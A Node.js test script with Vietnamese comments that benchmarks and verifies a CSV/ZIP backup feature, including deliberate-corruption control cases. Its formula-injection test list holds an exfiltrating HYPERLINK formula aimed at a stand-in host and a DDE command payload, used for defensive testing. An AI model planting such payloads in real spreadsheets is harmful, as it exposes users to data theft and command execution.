#!/usr/bin/env node
/* ==========================================================================
   scripts/thu-sao-luu.mjs — ĐO THẬT, KHÔNG ĐOÁN
   ---------------------------------------------------------------------------
   BH-05: không viết "chạy tốt" suông. Lệnh này dựng một bản sao lưu GIẢ nhưng
   ĐÚNG QUY MÔ THẬT của Alpha Green Commerce (số dòng lấy từ SPEC-0005 Mục 4.2)
   rồi trả về ba con số quyết định tính năng sống hay chết:

     ① CPU thật cho MỘT lô 2.000 dòng   → đối chiếu trần 10 ms/lượt cron
     ② Dung lượng thật một bản          → đối chiếu ước lượng 22 MB của Hồ Ly
     ③ File .zip có mở được thật không  → máy nén tự viết có đúng chuẩn không

   Đồng thời đẻ ra một thư mục thật để MỞ BẰNG EXCEL kiểm tiếng Việt và số 0.

   DÙNG:  npm run sao-luu-thu
   ========================================================================== */

import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  BOM, docO, phanTichCsv, dongCsv, dongTieuDe, keKhaiCsv, docCachDoc, kiemTraKeKhai,
  demDongCsv, noiByte, DONG_MOI_LO, LO_MOI_LUOT, LO_KHI_TRE, GIO_TANG_TOC, GIO_BAT_DAU, GIO_KET_THUC
} from '../src/sao-luu.js';
import { crc32, dauTep, cuoiTep, mucLuc } from '../src/zip.js';

const goc = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const raGoc = process.env.THU_SAO_LUU_RA || path.join(goc, '.thu-sao-luu');
const moc = new Date().toISOString().slice(0, 10);
const raThuMuc = path.join(raGoc, moc);
fs.rmSync(raGoc, { recursive: true, force: true });
fs.mkdirSync(raThuMuc, { recursive: true });

/* ==========================================================================
   Dữ liệu giả nhưng ĐÚNG HÌNH DẠNG THẬT
   ---------------------------------------------------------------------------
   Có dấu tiếng Việt, có dấu phẩy trong ô, có dấu nháy kép, có xuống dòng,
   có số điện thoại bắt đầu bằng 0 — đúng bốn thứ hay làm hỏng CSV.
   ========================================================================== */
const HO = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Bùi', 'Vũ', 'Phan', 'Đặng', 'Hoàng', 'Đỗ'];
const TEN = ['Thị Ngọc', 'Duy Phong', 'Khương Duy', 'Thị Hằng', 'Lan Hương', 'Thị Huyền', 'Văn Ánh', 'Quỳnh Như'];
const HANG = ['Hạnh nhân Mỹ nguyên vỏ', 'Óc chó Chile, loại 1', 'Nho khô Úc "Sunmuscat"', 'Macca Úc nứt vỏ', 'Hạt điều rang muối'];

function banGhiGia(i, bang) {
  const ten = `${HO[i % HO.length]} ${TEN[i % TEN.length]}`;
  const sdt = '0' + String(900000000 + (i * 7919) % 99999999).slice(0, 9);
  const base = {
    id: `${bang.slice(0, 3)}_${String(i).padStart(7, '0')}`,
    ma_nv: '0' + String(1000 + (i % 9000)),
    ho_ten: ten,
    sdt,
    ma_sku: '0' + String(100000 + (i % 900000)),
    san_pham: HANG[i % HANG.length],
    so_luong: (i % 500) + 1,
    don_gia: 120000 + (i % 90) * 1000,
    ghi_chu: i % 17 === 0
      ? `Khách báo: "hàng ẩm", đổi lô.\nĐã xử lý, hoàn ${(i % 5) + 1} kiện`
      : `Nhập kho Hà Nội, kệ A${i % 30}, ca sáng`,
    trang_thai: ['hien', 'an', 'cho_duyet'][i % 3],
    tao_luc: `2026-${String((i % 12) + 1).padStart(2, '0')}-${String((i % 28) + 1).padStart(2, '0')} 0${i % 9}:${String(i % 60).padStart(2, '0')}:00`
  };
  return base;
}
const COT = Object.keys(banGhiGia(0, 'x'));

/* Quy mô lấy từ SPEC-0005 Mục 4.2 — bản HẰNG NGÀY. */
const QUY_MO = [
  ['thong_bao', 40000], ['giao_dich_kho', 30000], ['lich_lam_viec', 15000],
  ['dang_ky_ca', 6000], ['ca_mo', 4000], ['cong_viec', 3000], ['tai_san', 1200],
  ['tai_san_lich_su', 1800], ['nhan_su', 60], ['tai_khoan', 60], ['san_pham', 400],
  ['nha_cung_cap', 40], ['kho', 5], ['phong_ban', 12], ['chuc_danh', 20],
  ['don_vi_tinh', 8], ['mau_ca', 10], ['gop_y', 300], ['gop_y_lich_su', 700],
  ['sku_map', 400], ['muc_tieu', 120]
];

/* ⚠️ Đo bằng đồng hồ ĐỘ PHÂN GIẢI CAO (hrtime), KHÔNG dùng process.cpuUsage():
   trên Windows cpuUsage nhảy từng nấc ~15,6 ms nên đo một lô 0,5 ms ra toàn số
   0 hoặc 16 — vô nghĩa. Vòng lặp dưới đây không có I/O nên thời gian đồng hồ
   CHÍNH LÀ thời gian CPU. Chạy nhiều vòng rồi chia, để nấc đồng hồ không ăn
   vào kết quả.
   Đây là V8 chạy trên Node ở máy này, không phải workerd trên máy Cloudflare —
   là số ĐẠI DIỆN, không phải số đo trên chính hạ tầng chạy thật. Cùng động cơ
   V8, cùng phép toán, nên sai khác là hằng số nhỏ chứ không phải bậc độ lớn. */
console.log('\n=== ① ĐO CPU MỘT LÔ ===');
let trungVi = 0, xauNhat = 0;
{
  const dongs = Array.from({ length: DONG_MOI_LO }, (_, i) => banGhiGia(i, 'thong_bao'));
  let dem = new Uint8Array(0);
  // Đúng những việc một lô THẬT phải làm: ghép CSV → mã hoá UTF-8 → nối vào
  // bộ đệm. CRC32 chỉ có ở bản THÁNG nên đo riêng.
  const moLo = (coCrc) => {
    let van = '';
    for (const r of dongs) van += dongCsv(COT, r);
    const bytes = new TextEncoder().encode(van);
    if (coCrc) crc32(bytes, 0);
    dem = noiByte(dem.subarray(0, 120000), bytes);   // đệm luôn còn < 256 KiB
    return dem.length;
  };
  const doLap = (coCrc) => {
    for (let k = 0; k < 20; k++) moLo(coCrc);
    const mau = [];
    for (let v = 0; v < 9; v++) {
      const N = 20, t0 = process.hrtime.bigint();
      for (let k = 0; k < N; k++) moLo(coCrc);
      mau.push(Number(process.hrtime.bigint() - t0) / 1e6 / N);
    }
    mau.sort((a, b) => a - b);
    return { giua: mau[4], xau: mau[8] };
  };
  // ⛔ B1: nay CẢ bản ngày cũng tính CRC32 (mã kiểm cho KIEM-TRA.csv), nên số
  // quyết định là số CÓ CRC. Đo luôn số KHÔNG CRC để thấy rõ cái giá phải trả.
  const khongCrc = doLap(false), coCrc = doLap(true);
  trungVi = coCrc.giua; xauNhat = coCrc.xau;
  console.log(`  Một lô ${DONG_MOI_LO} dòng (ghép CSV + mã hoá UTF-8 + CRC32 + nối đệm):`);
  console.log(`    NAY (có CRC32, cả bản ngày lẫn tháng): trung vị ${coCrc.giua.toFixed(2)} ms · xấu nhất ${coCrc.xau.toFixed(2)} ms`);
  console.log(`    Đối chiếu — nếu KHÔNG tính CRC32     : trung vị ${khongCrc.giua.toFixed(2)} ms · xấu nhất ${khongCrc.xau.toFixed(2)} ms`);
  console.log(`    → Giá của mã kiểm B1: +${(coCrc.giua - khongCrc.giua).toFixed(2)} ms mỗi lô.`);
}
const soLoLuot = LO_MOI_LUOT;
console.log(`  Một LƯỢT CRON = ${soLoLuot} lô → ${(trungVi * soLoLuot).toFixed(2)} ms ` +
  `(xấu nhất ${(xauNhat * soLoLuot).toFixed(2)} ms) · khi tăng tốc ${LO_KHI_TRE} lô → ${(xauNhat * LO_KHI_TRE).toFixed(2)} ms`);
console.log(`  Trần Cloudflare gói miễn phí: 10 ms CPU mỗi lượt cron — DÙNG CHUNG với đồng bộ Shopee/TikTok.`);
console.log(`  → ${xauNhat * LO_KHI_TRE < 10 ? 'ĐẠT — cả khi tăng tốc vẫn còn dư ' + (10 - xauNhat * LO_KHI_TRE).toFixed(1) + ' ms cho phần cron khác' : '❌ VƯỢT — phải hạ LO_MOI_LUOT hoặc DONG_MOI_LO'}`);

/* ==========================================================================
   ② DỰNG BẢN SAO LƯU THẬT, ĐO DUNG LƯỢNG
   ========================================================================== */
console.log('\n=== ② DỰNG BẢN SAO LƯU VÀ ĐO DUNG LƯỢNG ===');
const keKhai = [];
const zipMuc = [];
const manhZip = [];
let viTriZip = 0;
function nhetZip(bytes) { manhZip.push(bytes); viTriZip += bytes.length; }

for (const [bang, soDong] of QUY_MO) {
  let van = BOM + dongTieuDe(COT);
  for (let i = 0; i < soDong; i++) van += dongCsv(COT, banGhiGia(i, bang));
  const bytes = new TextEncoder().encode(van);
  fs.writeFileSync(path.join(raThuMuc, `${bang}.csv`), bytes);
  const c = crc32(bytes, 0);
  keKhai.push({ bang, so_dong: soDong, co_byte: bytes.length, crc: c });   // ⛔ B1

  const viTriDau = viTriZip;
  nhetZip(dauTep(`${bang}.csv`));
  nhetZip(bytes);
  nhetZip(cuoiTep(c, bytes.length));
  zipMuc.push({ ten: `${bang}.csv`, crc: c, coByte: bytes.length, viTriDau, luc: Date.now() });
}

const vanDoc = docCachDoc({ moc, loai: 'ngay', keKhai });
const vanKe = keKhaiCsv(keKhai);
fs.writeFileSync(path.join(raThuMuc, 'DOC-CACH-DOC.txt'), new TextEncoder().encode(vanDoc));
fs.writeFileSync(path.join(raThuMuc, 'KIEM-TRA.csv'), new TextEncoder().encode(vanKe));

const tongByte = keKhai.reduce((t, k) => t + k.co_byte, 0);
const tongDong = keKhai.reduce((t, k) => t + k.so_dong, 0);
console.log(`  ${keKhai.length} bảng · ${tongDong.toLocaleString('vi-VN')} dòng`);
console.log(`  DUNG LƯỢNG THẬT: ${(tongByte / 1048576).toFixed(2)} MB`);
console.log(`  Hồ Ly ước lượng : 22 MB  → lệch ${((tongByte / 1048576 / 22 - 1) * 100).toFixed(0)}%`);
console.log(`  Giữ ${30} bản ngày → ${(tongByte * 30 / 1073741824).toFixed(2)} GB trên Drive`);
// Mỗi bảng cần floor(dòng/2000)+1 lô: lô cuối trả về ít hơn 2.000 dòng chính
// là dấu hiệu "hết bảng". Bảng rỗng vẫn tốn 1 lô.
const soLo = QUY_MO.reduce((t, [, n]) => t + Math.floor(n / DONG_MOI_LO) + 1, 0);
const soLuot = Math.ceil(soLo / LO_MOI_LUOT);
// Cửa sổ GIO_BAT_DAU→GIO_KET_THUC, mỗi giờ 12 lượt, BỎ lượt đầu giờ (lượt đó
// dành cho dongBoDonHangNen kéo hàng nghìn đơn về).
// Sức chứa một đêm: chạy 1 lô/lượt tới GIO_TANG_TOC, sau đó 2 lô/lượt.
const sucChua = (GIO_TANG_TOC - GIO_BAT_DAU) * 11 * LO_MOI_LUOT
              + (GIO_KET_THUC - GIO_TANG_TOC) * 11 * LO_KHI_TRE;
console.log(`  Số lô cần: ${soLo}`);
console.log(`  Sức chứa một đêm (${GIO_BAT_DAU}h–${GIO_KET_THUC}h, tăng tốc từ ${GIO_TANG_TOC}h): ${sucChua} lô → ` +
  `${soLo <= sucChua ? `xong trong MỘT đêm, dư ${sucChua - soLo} lô cho bản tháng` : '❌ KHÔNG xong trong một đêm'}`);
console.log(`  TRẦN CỦA THIẾT KẾ: ~${(sucChua * DONG_MOI_LO / 1000).toFixed(0)}.000 dòng/ngày ` +
  `(nay ${(tongDong / 1000).toFixed(0)}.000 → dùng ${(soLo / sucChua * 100).toFixed(0)}% sức)`);
console.log(`  Số mẩu 256 KiB đẩy lên Drive: ~${Math.ceil(tongByte / 262144)} → ` +
  `~${(Math.ceil(tongByte / 262144) / soLuot).toFixed(1)} yêu cầu mạng mỗi lượt (trần 50)`);

/* ==========================================================================
   ③ GÓI ZIP VÀ THỬ MỞ
   ========================================================================== */
console.log('\n=== ③ FILE NÉN CHO BẢN THÁNG ===');
for (const [ten, noi] of [['DOC-CACH-DOC.txt', vanDoc], ['KIEM-TRA.csv', vanKe]]) {
  const b = new TextEncoder().encode(noi);
  const viTriDau = viTriZip;
  nhetZip(dauTep(ten)); nhetZip(b);
  const c = crc32(b, 0);
  nhetZip(cuoiTep(c, b.length));
  zipMuc.push({ ten, crc: c, coByte: b.length, viTriDau, luc: Date.now() });
}
nhetZip(mucLuc(zipMuc, viTriZip));
const duongZip = path.join(raGoc, `sao-luu-AGC-${moc.slice(0, 7)}.zip`);
fs.writeFileSync(duongZip, Buffer.concat(manhZip.map(Buffer.from)));
console.log(`  Đã gói: ${duongZip}`);
console.log(`  Dung lượng: ${(fs.statSync(duongZip).size / 1048576).toFixed(2)} MB (không nén, cố ý — CPU quý hơn dung lượng)`);

/* ==========================================================================
   ④ CA ĐỐI CHỨNG CÓ LỖI CỐ Ý (BH-16)
   ========================================================================== */
console.log('\n=== ④ CA ĐỐI CHỨNG — CỐ Ý LÀM HỎNG ===');
const thucTe = fs.readdirSync(raThuMuc).map(ten => {
  const d = path.join(raThuMuc, ten);
  const o = { ten, co_byte: fs.statSync(d).size };
  if (ten.endsWith('.csv') && ten !== 'KIEM-TRA.csv') {
    const bytes = fs.readFileSync(d);
    o.so_dong = demDongCsv(bytes.toString('utf8'));
    o.crc = crc32(bytes, 0);           // ⛔ B1 — mã kiểm từng byte
  }
  return o;
});

let hongPhepDo = false;
function ca(nhan, dsThucTe, mongDoi, dsKeKhai) {
  const kq = kiemTraKeKhai(dsKeKhai || keKhai, dsThucTe);
  const dung = mongDoi === 'dat' ? kq.dat : !kq.dat;
  if (!dung) hongPhepDo = true;
  console.log(`  ${dung ? '✅' : '❌'} ${nhan}: ${kq.dat ? 'ĐẠT' : 'HỎNG — ' + kq.loi[0]}`);
}
ca('Bản nguyên vẹn → phải ĐẠT', thucTe, 'dat');
ca('Xoá hẳn nhan_su.csv → phải HỎNG', thucTe.filter(t => t.ten !== 'nhan_su.csv'), 'hong');
ca('Cắt cụt thong_bao.csv 100 byte → phải HỎNG',
  thucTe.map(t => t.ten === 'thong_bao.csv' ? { ...t, co_byte: t.co_byte - 100 } : t), 'hong');
ca('Mất 1 dòng trong giao_dich_kho.csv → phải HỎNG',
  thucTe.map(t => t.ten === 'giao_dich_kho.csv' ? { ...t, so_dong: t.so_dong - 1 } : t), 'hong');

/* ⛔ B1 — CA VÒNG TRƯỚC LỌT LƯỚI. Sửa ĐÚNG MỘT KÝ TỰ giữa file, GIỮ NGUYÊN cỡ
   và số dòng. Trước khi có cột crc32 thì phép kiểm báo "✅ ĐẠT" trong khi số
   lương đã sai. Sửa byte THẬT trên đĩa rồi đọc lại, không giả lập. */
{
  const d = path.join(raThuMuc, 'nhan_su.csv');
  const goc = fs.readFileSync(d);
  const suaB = Buffer.from(goc);
  const i = Math.floor(suaB.length / 2);
  suaB[i] = suaB[i] === 0x41 ? 0x42 : 0x41;
  fs.writeFileSync(d, suaB);
  const sau = fs.readFileSync(d);
  const doc = { ten: 'nhan_su.csv', co_byte: fs.statSync(d).size,
                so_dong: demDongCsv(sau.toString('utf8')), crc: crc32(sau, 0) };
  const cungCo = goc.length === sau.length &&
    doc.so_dong === thucTe.find(t => t.ten === 'nhan_su.csv').so_dong;
  console.log(`  (đã sửa 1 byte ở vị trí ${i}; cỡ ${goc.length}→${sau.length} byte, ` +
    `số dòng ${cungCo ? 'KHÔNG đổi' : 'ĐỔI — ca thử không hợp lệ'})`);
  ca('⛔ B1 · Sửa 1 ký tự giữa nhan_su.csv, GIỮ NGUYÊN cỡ → phải HỎNG',
    thucTe.map(t => t.ten === 'nhan_su.csv' ? doc : t), 'hong');
  fs.writeFileSync(d, goc);   // trả lại nguyên trạng
  ca('   đối chứng: trả lại nguyên trạng → phải ĐẠT lại', thucTe, 'dat');
}

/* ⛔ B1 — bản kê khai KHÔNG có cột crc32 (bản mã đời cũ) phải KÊU, không im. */
ca('⛔ B1 · Bản kê khai thiếu cột crc32 → phải HỎNG',
  thucTe, 'hong', keKhai.map(k => ({ bang: k.bang, so_dong: k.so_dong, co_byte: k.co_byte })));

/* ==========================================================================
   ④b ⛔ B2 — Ô NHÂN VIÊN TỰ GÕ KHÔNG ĐƯỢC CHẠY NHƯ CÔNG THỨC,
        VÀ PHẢI HOÀN NGUYÊN ĐÚNG TỪNG BYTE
   ---------------------------------------------------------------------------
   Vá kiểu làm hỏng giá trị gốc là đổi một lỗ lấy một lỗ tệ hơn. Nên ca thử này
   đi TRỌN VÒNG: chuỗi gốc → ô CSV → ghép thành file → phân tích lại → docO()
   → so TỪNG BYTE với chuỗi gốc.
   ========================================================================== */
console.log('\n=== ④b ⛔ B2 · Ô CÔNG THỨC EXCEL — CHẶN, VÀ HOÀN NGUYÊN ĐÚNG ===');
{
  const NGUY = [
    ['=1+1', 'phép tính trần'],
    ['=HYPERLINK("http://xau.vn/?d="&A1,"Bấm vào đây")', 'rút dữ liệu ra ngoài'],
    ['+84901234567', 'dấu cộng đầu số điện thoại'],
    ['-2+3', 'dấu trừ'],
    ['@SUM(A1:A9)', 'kiểu Lotus, Excel vẫn nhận'],
    ['\t=cmd|\'/c calc\'!A1', 'Tab đứng trước — Excel cắt Tab rồi mới xét'],
    ['\n=1+1', 'xuống dòng đứng trước'],
    ['\r=1+1', 'ký tự \\r đứng trước'],
    ["'=1+1", 'vốn đã có dấu nháy đơn — phải hoàn nguyên đúng, không nuốt mất'],
    ['Khách báo: "hàng ẩm", đổi lô.\nĐã xử lý, hoàn 2 kiện', 'ghi chú thật: nháy + phẩy + xuống dòng'],
    ['=1+1,=2+2', 'công thức có cả dấu phẩy'],
    ['Bình thường, không sao', 'ô thường — không được đụng vào'],
    ['0987654321', 'số 0 đứng đầu ở cột KHÔNG bọc'],
    ['="0123"', 'chuỗi trông y hệt cái rào ="0…" — không được nhập nhằng'],
    ['', 'ô rỗng']
  ];

  let hongB2 = false;
  // Dựng một file CSV THẬT: 1 cột `sdt` (thuộc diện bọc ="0…") + 1 cột
  // `ghi_chu` (ô nhân viên tự gõ). Đi qua đúng đường dongCsv/phanTichCsv.
  const cot = ['sdt', 'ghi_chu'];
  const goc = NGUY.map(([s]) => ({ sdt: '0987654321', ghi_chu: s }));
  let van = BOM + dongTieuDe(cot);
  for (const r of goc) van += dongCsv(cot, r);
  const hang = phanTichCsv(van);

  const nhi = s => Buffer.from(s, 'utf8').toString('hex');
  for (let i = 0; i < NGUY.length; i++) {
    const [s, viSao] = NGUY[i];
    const oTho = hang[i + 1][1];                 // +1 vì dòng đầu là tiêu đề
    const veLai = docO(oTho);
    const antoan = oTho === '' || !'=+-@'.includes(oTho[0]);
    const khop = nhi(veLai) === nhi(s);
    if (!antoan || !khop) { hongB2 = true; hongPhepDo = true; }
    const nhan = JSON.stringify(s).slice(0, 46).padEnd(48);
    console.log(`  ${antoan ? '✅' : '❌'} chặn  ${khop ? '✅' : '❌'} hoàn nguyên  ${nhan} ${viSao}`);
    if (!khop) console.log(`      gốc  ${nhi(s)}\n      về   ${nhi(veLai)}`);
  }
  // Cột bọc ="0…" cũng phải hoàn nguyên đúng.
  const veSdt = docO(hang[1][0]);
  const okSdt = veSdt === '0987654321';
  if (!okSdt) { hongB2 = true; hongPhepDo = true; }
  console.log(`  ${okSdt ? '✅' : '❌'} cột bọc ="0…" hoàn nguyên: ${JSON.stringify(hang[1][0])} → ${JSON.stringify(veSdt)}`);
  console.log(`  ${hongB2 ? '❌ B2 CHƯA VÁ XONG' : `✅ ${NGUY.length}/${NGUY.length} ca: không ô nào chạy được, và mọi ô về đúng từng byte`}`);
}

/* ---- Tiếng Việt và số 0 đứng đầu --------------------------------------- */
console.log('\n=== ⑤ TIẾNG VIỆT VÀ SỐ 0 ĐỨNG ĐẦU ===');
const mau = fs.readFileSync(path.join(raThuMuc, 'nhan_su.csv'));
const coBom = mau[0] === 0xEF && mau[1] === 0xBB && mau[2] === 0xBF;
const chu = mau.toString('utf8');
const dong2 = chu.split('\r\n')[1];
console.log(`  ${coBom ? '✅' : '❌'} BOM UTF-8 ở đầu file (thiếu là Excel hiện "Nguyá»…n")`);
console.log(`  ${/Nguyễn|Bùi|Phạm/.test(chu) ? '✅' : '❌'} Tiếng Việt có dấu trong nội dung`);
console.log(`  ${/"="{2}0\d+"{3}/.test(dong2) ? '✅' : '❌'} Số điện thoại / mã bọc ="0..." để Excel giữ số 0`);
console.log(`  Dòng dữ liệu đầu tiên (mở bằng Excel để mắt kiểm lần cuối):`);
console.log(`    ${dong2.slice(0, 150)}`);

console.log(`\nThư mục mở bằng Excel: ${raThuMuc}`);
console.log(hongPhepDo
  ? '\n❌ CÓ CA ĐỐI CHỨNG SAI — phép kiểm hỏng, không được tin kết quả.\n'
  : '\n✅ Mọi ca đối chứng đúng như mong đợi.\n');
process.exit(hongPhepDo ? 1 : 0);
